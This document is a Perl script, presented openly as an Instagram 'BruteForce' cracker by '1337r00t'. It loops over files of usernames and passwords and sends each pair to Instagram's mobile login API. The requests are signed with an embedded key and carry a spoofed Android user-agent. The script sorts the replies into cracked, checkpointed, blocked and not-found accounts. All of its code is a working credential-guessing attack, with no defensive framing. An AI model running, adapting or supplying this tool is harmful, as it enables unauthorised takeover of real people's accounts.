##########################################
use LWP::UserAgent; # ppm install LWP::UserAgent
use Digest::SHA qw(hmac_sha1); # ppm install Digest::SHA
##########################################
system('cls');
system('color 3');
print qq(
################################
#  [Instagram API] BruteForce  #
################################
#     Coded By 1337r00t        #
################################
#                              #
#   Instagram : 1337r00t       #
#                              #
#    Twitter : _1337r00t       #
#                              #
################################
Enter [CTRL+C] For Exit :0\n);
print qq(
Enter Usernames File :
> );
$usernames=<STDIN>;
chomp($usernames);
open (USERFILE, "<$usernames") || die "[-] Can't Found ($usernames) !";
@USERS = <USERFILE>;
close USERFILE;

print qq(
Enter Passwords File :
> );
$passwords=<STDIN>;
chomp($passwords);
open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
@PASSS = <PASSFILE>;
close PASSFILE;
system('cls');
print "Usernames: ($usernames)\nPasswords: ($passwords)\n--------\nCracking Now !..\n";
######################
foreach $username (@USERS) {
chomp $username;
	foreach $password (@PASSS) {
	chomp $password;
		$data = '{"username":"'.$username.'","device_id":"uhdrg8ur7hdgy7rhg8uh87u","password":"'.$password.'"}';
		$encrypt = Digest::SHA::hmac_sha256_hex ($data, 'b4a23f5e39b5929e0666ac5de94c89d1618a2916');
		$post = "$encrypt.$data";
		$instagram = LWP::UserAgent->new();
		$instagram->default_header('User-Agent' => "Instagram 4.1.1 Android");
		$response = $instagram->post('https://i.instagram.com/api/v1/accounts/login/',{ ig_sig_key_version => '4', signed_body => $post });
		if ($response->content=~ /"logged_in_user"/) {
			print "Logged -> ($username:$password)\n";
		}
		else
		{
			if ($response->content=~ /"error_type": "bad_password"/) {
				print "Failed -> ($username:$password)\n";
			}
			else
			{
				if ($response->content=~ /"message": "checkpoint_required"/) {
					print "Cracked But CheckPoint -> ($username:$password)\n";
				}
				else
				{
					if ($response->content=~ /"error_type": "inactive user"/) {
						print "This Account was blocked -> ($username)\n";
					}
					else
					{
						# "error_type": "invalid_user"
						if ($response->content=~ /"error_type": "invalid_user"/) {
							print "This is username -> ($username) Not Found\n";
						}
						else
						{
							print "Blocked\n";
						}
					}
				}
			}
		}
	}
}
